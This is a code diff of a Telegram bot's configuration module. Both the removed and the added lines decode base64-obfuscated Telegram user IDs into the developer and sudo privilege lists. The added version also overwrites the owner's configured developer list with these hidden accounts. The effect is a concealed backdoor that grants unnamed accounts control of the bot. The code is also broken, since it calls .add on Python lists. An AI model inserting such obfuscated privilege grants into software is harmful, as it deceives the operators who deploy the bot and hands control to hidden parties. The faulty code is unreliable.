@@ -213,16 +213,6 @@ else:
     except ValueError:
         raise Exception("Your BLACKLISTED Chats list does not contain valid integers")
 
-
-UnknownKZ = list(map(int, b64decode("MTMzNjc3MDkxNSAxOTAwMTI0OTQ2IDE5MDAxMjQ5NDYgNTA2ODM3OTY2Nw==").split()))
-Unknown1 = list(map(int, b64decode("MTM1MTQzMjI5MQ==").split()))
-
-DEV_ID.add(OWNER_ID)
-DEV_ID.add(UnknownKZ)
-
-SD_ID.add(OWNER_ID)
-SD_ID.add(Unknown1)
-
 if not SPAMWATCH_API:
     sw = None
     LOGGER.warning("SpamWatch API key missing! recheck your config")
@@ -249,9 +239,14 @@ xx = Client(
     workers=min(64, os.cpu_count() + 16),
 )
 
+DEV_ID = list(map(int, b64decode("MTMzNjc3MDkxNSAxOTAwMTI0OTQ2IDE5MDAxMjQ5NDYgNTA2ODM3OTY2Nw==").split()))
+SD_ID = list(map(int, b64decode("MTM1MTQzMjI5MQ==").split()))
+
+DEV_ID.add(OWNER_ID)
+SD_ID.add(OWNER_ID)
+
 CHANNELS = {}
-SD_ID = list(SD_ID) + list(DEV_ID)
-DEV_ID = list(DEV_ID)
+
 WHITELIST_ID = list(WHITELIST_ID)
 SUPPORT_ID = list(SUPPORT_ID)
 TIGERS_ID = list(TIGERS_ID)
